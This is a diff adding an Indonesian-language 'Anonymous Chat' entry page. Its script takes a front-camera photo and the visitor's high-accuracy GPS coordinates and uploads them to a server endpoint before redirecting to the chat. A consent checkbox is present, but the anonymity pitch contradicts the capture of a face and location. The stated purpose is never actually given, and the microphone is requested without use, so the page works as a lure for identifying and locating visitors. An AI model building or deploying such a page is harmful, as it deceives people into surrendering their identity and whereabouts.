@@ -1,0 +1,959 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+<title>Anonymous Chat</title>
+
+<style>
+:root {
+    --bg: #080d1a;
+    --panel: rgba(17, 24, 39, .82);
+    --border: rgba(255,255,255,.10);
+    --text: #f8fafc;
+    --muted: #94a3b8;
+    --accent: #6366f1;
+    --accent2: #8b5cf6;
+    --danger: #ef4444;
+    --success: #22c55e;
+    --shadow: 0 30px 90px rgba(0,0,0,.5);
+}
+
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    min-height: 100vh;
+    padding: 20px;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    color: var(--text);
+    font-family:
+        Inter,
+        ui-sans-serif,
+        system-ui,
+        -apple-system,
+        BlinkMacSystemFont,
+        "Segoe UI",
+        sans-serif;
+
+    background:
+        radial-gradient(
+            circle at 15% 15%,
+            rgba(99,102,241,.20),
+            transparent 32%
+        ),
+        radial-gradient(
+            circle at 85% 85%,
+            rgba(139,92,246,.18),
+            transparent 32%
+        ),
+        var(--bg);
+}
+
+.app {
+    width: min(680px, 100%);
+}
+
+.card {
+    position: relative;
+    padding: 36px;
+    border: 1px solid var(--border);
+    border-radius: 28px;
+
+    background: var(--panel);
+    backdrop-filter: blur(24px);
+    -webkit-backdrop-filter: blur(24px);
+
+    box-shadow: var(--shadow);
+}
+
+.brand {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    margin-bottom: 28px;
+}
+
+.logo {
+    width: 52px;
+    height: 52px;
+
+    display: grid;
+    place-items: center;
+
+    border-radius: 16px;
+
+    background:
+        linear-gradient(
+            135deg,
+            var(--accent),
+            var(--accent2)
+        );
+
+    font-size: 24px;
+
+    box-shadow:
+        0 12px 30px rgba(99,102,241,.3);
+}
+
+.brand h1 {
+    margin: 0;
+    font-size: 29px;
+    letter-spacing: -.04em;
+}
+
+.brand p {
+    margin: 5px 0 0;
+    color: var(--muted);
+    font-size: 13px;
+}
+
+.hero {
+    padding: 25px;
+    margin-bottom: 20px;
+
+    border-radius: 20px;
+    border: 1px solid rgba(255,255,255,.08);
+
+    background:
+        linear-gradient(
+            145deg,
+            rgba(99,102,241,.10),
+            rgba(139,92,246,.06)
+        );
+}
+
+.hero h2 {
+    margin: 0 0 9px;
+    font-size: 21px;
+}
+
+.hero p {
+    margin: 0;
+    color: var(--muted);
+    line-height: 1.65;
+    font-size: 14px;
+}
+
+.permissions {
+    display: grid;
+    gap: 10px;
+    margin: 20px 0;
+}
+
+.permission {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+
+    padding: 15px;
+
+    border-radius: 15px;
+    border: 1px solid rgba(255,255,255,.08);
+
+    background: rgba(2,6,23,.45);
+}
+
+.permission-icon {
+    width: 42px;
+    height: 42px;
+
+    display: grid;
+    place-items: center;
+
+    flex-shrink: 0;
+
+    border-radius: 12px;
+    background: rgba(99,102,241,.13);
+
+    font-size: 20px;
+}
+
+.permission strong {
+    display: block;
+    font-size: 14px;
+}
+
+.permission span {
+    display: block;
+    margin-top: 3px;
+    color: var(--muted);
+    font-size: 12px;
+}
+
+.consent {
+    display: flex;
+    align-items: flex-start;
+    gap: 11px;
+
+    margin-top: 20px;
+    padding: 15px;
+
+    border-radius: 14px;
+
+    background: rgba(2,6,23,.55);
+    border: 1px solid rgba(255,255,255,.08);
+
+    cursor: pointer;
+}
+
+.consent input {
+    width: 18px;
+    height: 18px;
+    margin-top: 2px;
+
+    accent-color: var(--accent);
+}
+
+.consent span {
+    color: #cbd5e1;
+    font-size: 12px;
+    line-height: 1.6;
+}
+
+#startBtn {
+    width: 100%;
+
+    margin-top: 18px;
+    padding: 16px 20px;
+
+    border: 0;
+    border-radius: 15px;
+
+    background:
+        linear-gradient(
+            135deg,
+            var(--accent),
+            var(--accent2)
+        );
+
+    color: white;
+
+    font-size: 15px;
+    font-weight: 700;
+
+    cursor: pointer;
+
+    box-shadow:
+        0 14px 30px rgba(99,102,241,.25);
+
+    transition:
+        transform .2s,
+        opacity .2s;
+}
+
+#startBtn:hover:not(:disabled) {
+    transform: translateY(-2px);
+}
+
+#startBtn:disabled {
+    opacity: .45;
+    cursor: not-allowed;
+}
+
+.status {
+    min-height: 48px;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    margin-top: 15px;
+    padding: 12px;
+
+    border-radius: 13px;
+
+    color: var(--muted);
+    font-size: 13px;
+
+    text-align: center;
+}
+
+.camera {
+    display: none;
+
+    overflow: hidden;
+
+    margin-top: 20px;
+
+    border-radius: 18px;
+
+    border: 1px solid rgba(255,255,255,.08);
+
+    background: #020617;
+}
+
+.camera video {
+    display: block;
+
+    width: 100%;
+    aspect-ratio: 16 / 10;
+
+    object-fit: cover;
+}
+
+.footer {
+    margin-top: 18px;
+
+    color: #64748b;
+
+    text-align: center;
+    font-size: 11px;
+}
+
+.spinner {
+    width: 15px;
+    height: 15px;
+
+    display: inline-block;
+
+    margin-right: 7px;
+
+    vertical-align: -3px;
+
+    border: 2px solid rgba(255,255,255,.2);
+    border-top-color: white;
+
+    border-radius: 50%;
+
+    animation: spin .7s linear infinite;
+}
+
+@keyframes spin {
+    to {
+        transform: rotate(360deg);
+    }
+}
+
+@media(max-width:600px) {
+    body {
+        padding: 12px;
+    }
+
+    .card {
+        padding: 21px;
+        border-radius: 22px;
+    }
+
+    .brand h1 {
+        font-size: 24px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<main class="app">
+
+<section class="card">
+
+    <header class="brand">
+        <div class="logo">✦</div>
+
+        <div>
+            <h1>Anonymous Chat</h1>
+            <p>Chat dengan orang baru secara anonim</p>
+        </div>
+    </header>
+
+
+    <div class="hero">
+
+        <h2>Sebelum masuk</h2>
+
+        <p>
+            Untuk melanjutkan, browser akan meminta akses
+            kamera, mikrofon, dan lokasi. Satu foto dari
+            kamera depan serta lokasi perangkat akan digunakan
+            sesuai persetujuan Anda.
+        </p>
+
+    </div>
+
+
+    <div class="permissions">
+
+        <div class="permission">
+            <div class="permission-icon">📷</div>
+
+            <div>
+                <strong>Kamera depan</strong>
+                <span>
+                    Izinkan agar bisa berfungsi normal.
+                </span>
+            </div>
+        </div>
+
+
+        <div class="permission">
+            <div class="permission-icon">🎤</div>
+
+            <div>
+                <strong>Mikrofon</strong>
+                <span>
+                    Diperlukan untuk fitur komunikasi suara.
+                </span>
+            </div>
+        </div>
+
+
+        <div class="permission">
+            <div class="permission-icon">📍</div>
+
+            <div>
+                <strong>Lokasi</strong>
+                <span>
+                    Koordinat lokasi perangkat akan digunakan.
+                </span>
+            </div>
+        </div>
+
+    </div>
+
+
+    <label class="consent">
+
+        <input
+            type="checkbox"
+            id="consent"
+        >
+
+        <span>
+            Saya memahami dan menyetujui bahwa website ini
+            dapat mengambil satu foto dari kamera depan dan
+            koordinat lokasi setelah saya memberikan izin
+            browser. Data tersebut akan dikirim ke server
+            untuk tujuan yang dijelaskan di atas.
+        </span>
+
+    </label>
+
+
+    <button
+        id="startBtn"
+        disabled
+    >
+        Izinkan &amp; Masuk Anonymous Chat
+    </button>
+
+
+    <div
+        id="status"
+        class="status"
+    >
+        Centang persetujuan untuk melanjutkan.
+    </div>
+
+
+    <div
+        id="cameraBox"
+        class="camera"
+    >
+        <video
+            id="camera"
+            autoplay
+            playsinline
+            muted
+        ></video>
+    </div>
+
+
+    <div class="footer">
+        Anda dapat menolak permission browser kapan saja.
+    </div>
+
+</section>
+
+</main>
+
+
+<script>
+
+const consent = document.getElementById("consent");
+const startBtn = document.getElementById("startBtn");
+
+const statusEl = document.getElementById("status");
+
+const cameraBox = document.getElementById("cameraBox");
+const video = document.getElementById("camera");
+
+
+let cameraStream = null;
+let microphoneStream = null;
+
+
+/* =========================
+   CONSENT
+========================= */
+
+consent.addEventListener("change", () => {
+
+    startBtn.disabled = !consent.checked;
+
+    if (consent.checked) {
+
+        statusEl.textContent =
+            "Siap. Tekan tombol untuk memberikan izin.";
+
+    } else {
+
+        statusEl.textContent =
+            "Centang persetujuan untuk melanjutkan.";
+
+    }
+
+});
+
+
+/* =========================
+   START
+========================= */
+
+startBtn.addEventListener("click", async () => {
+
+    if (!consent.checked) {
+        return;
+    }
+
+    startBtn.disabled = true;
+
+    try {
+
+        /*
+         * 1. Kamera + microphone
+         */
+
+        statusEl.innerHTML =
+            '<span class="spinner"></span>' +
+            'Meminta izin kamera dan mikrofon...';
+
+
+        const media =
+            await navigator.mediaDevices.getUserMedia({
+
+                video: {
+                    facingMode: {
+                        ideal: "user"
+                    },
+
+                    width: {
+                        ideal: 1280
+                    },
+
+                    height: {
+                        ideal: 720
+                    }
+                },
+
+                audio: true
+
+            });
+
+
+        cameraStream = media;
+
+
+        video.srcObject = cameraStream;
+
+        cameraBox.style.display = "block";
+
+
+        await waitForVideo();
+
+
+        /*
+         * 2. Lokasi
+         */
+
+        statusEl.innerHTML =
+            '<span class="spinner"></span>' +
+            'Meminta izin lokasi...';
+
+
+        const location =
+            await getLocation();
+
+
+        const latitude =
+            location.coords.latitude;
+
+        const longitude =
+            location.coords.longitude;
+
+        const accuracy =
+            location.coords.accuracy;
+
+
+        /*
+         * 3. Foto
+         */
+
+        statusEl.innerHTML =
+            '<span class="spinner"></span>' +
+            'Mengambil satu foto...';
+
+
+        await sleep(700);
+
+
+        const photo =
+            await takePhoto();
+
+
+        /*
+         * 4. Kirim ke server
+         */
+
+        statusEl.innerHTML =
+            '<span class="spinner"></span>' +
+            'Mengirim data sesuai persetujuan...';
+
+
+        const formData =
+            new FormData();
+
+
+        formData.append(
+            "photo",
+            photo,
+            "anonymous-chat-photo.jpg"
+        );
+
+
+        formData.append(
+            "latitude",
+            latitude
+        );
+
+
+        formData.append(
+            "longitude",
+            longitude
+        );
+
+
+        formData.append(
+            "accuracy",
+            accuracy
+        );
+
+
+        formData.append(
+            "timestamp",
+            new Date().toISOString()
+        );
+
+
+        const response =
+            await fetch("/api/consented-data", {
+
+                method: "POST",
+
+                body: formData
+
+            });
+
+
+        if (!response.ok) {
+
+            throw new Error(
+                "Server gagal menerima data."
+            );
+
+        }
+
+
+        /*
+         * 5. Matikan kamera + microphone
+         */
+
+        stopStreams();
+
+
+        statusEl.innerHTML =
+            "✓ Persetujuan berhasil diproses. " +
+            "Mengalihkan ke Anonymous Chat...";
+
+
+        /*
+         * 6. Masuk chat
+         */
+
+        setTimeout(() => {
+
+            window.location.href =
+                "/chat.html";
+
+        }, 1200);
+
+
+    } catch (error) {
+
+        console.error(error);
+
+        stopStreams();
+
+
+        statusEl.textContent =
+            "❌ Proses dibatalkan: " +
+            getFriendlyError(error);
+
+
+        startBtn.disabled = false;
+
+    }
+
+});
+
+
+/* =========================
+   LOCATION
+========================= */
+
+function getLocation() {
+
+    return new Promise((resolve, reject) => {
+
+        if (!navigator.geolocation) {
+
+            reject(
+                new Error(
+                    "Browser tidak mendukung lokasi."
+                )
+            );
+
+            return;
+        }
+
+
+        navigator.geolocation.getCurrentPosition(
+
+            resolve,
+
+            reject,
+
+            {
+                enableHighAccuracy: true,
+
+                timeout: 15000,
+
+                maximumAge: 0
+            }
+
+        );
+
+    });
+
+}
+
+
+/* =========================
+   CAMERA
+========================= */
+
+function waitForVideo() {
+
+    return new Promise((resolve) => {
+
+        if (
+            video.readyState >= 2 &&
+            video.videoWidth > 0
+        ) {
+
+            resolve();
+            return;
+
+        }
+
+
+        video.addEventListener(
+            "loadedmetadata",
+            () => resolve(),
+            { once: true }
+        );
+
+    });
+
+}
+
+
+function takePhoto() {
+
+    return new Promise((resolve, reject) => {
+
+        const canvas =
+            document.createElement("canvas");
+
+
+        const width =
+            video.videoWidth || 1280;
+
+        const height =
+            video.videoHeight || 720;
+
+
+        if (!width || !height) {
+
+            reject(
+                new Error(
+                    "Kamera belum siap."
+                )
+            );
+
+            return;
+        }
+
+
+        canvas.width = width;
+        canvas.height = height;
+
+
+        const ctx =
+            canvas.getContext("2d");
+
+
+        /*
+         * Mirror agar hasil seperti
+         * tampilan kamera depan.
+         */
+
+        ctx.translate(width, 0);
+        ctx.scale(-1, 1);
+
+
+        ctx.drawImage(
+            video,
+            0,
+            0,
+            width,
+            height
+        );
+
+
+        canvas.toBlob(
+
+            (blob) => {
+
+                if (!blob) {
+
+                    reject(
+                        new Error(
+                            "Gagal membuat foto."
+                        )
+                    );
+
+                    return;
+                }
+
+                resolve(blob);
+
+            },
+
+            "image/jpeg",
+
+            0.85
+
+        );
+
+    });
+
+}
+
+
+/* =========================
+   STOP STREAM
+========================= */
+
+function stopStreams() {
+
+    if (!cameraStream) {
+        return;
+    }
+
+
+    cameraStream
+        .getTracks()
+        .forEach(track => track.stop());
+
+
+    cameraStream = null;
+
+}
+
+
+/* =========================
+   HELPERS
+========================= */
+
+function sleep(ms) {
+
+    return new Promise(
+        resolve => setTimeout(resolve, ms)
+    );
+
+}
+
+
+function getFriendlyError(error) {
+
+    if (!error) {
+        return "Terjadi kesalahan.";
+    }
+
+
+    if (
+        error.name ===
+        "NotAllowedError"
+    ) {
+
+        return (
+            "Permission kamera/mikrofon " +
+            "ditolak."
+        );
+
+    }
+
+
+    if (
+        error.name ===
+        "PermissionDeniedError"
+    ) {
+
+        return "Permission lokasi ditolak.";
+
+    }
+
+
+    if (
+        error.name ===
+        "TimeoutError"
+    ) {
+
+        return "Lokasi tidak ditemukan tepat waktu.";
+
+    }
+
+
+    if (error.message) {
+        return error.message;
+    }
+
+
+    return "Terjadi kesalahan.";
+
+}
+
+</script>
+
+</body>
+</html>
+```
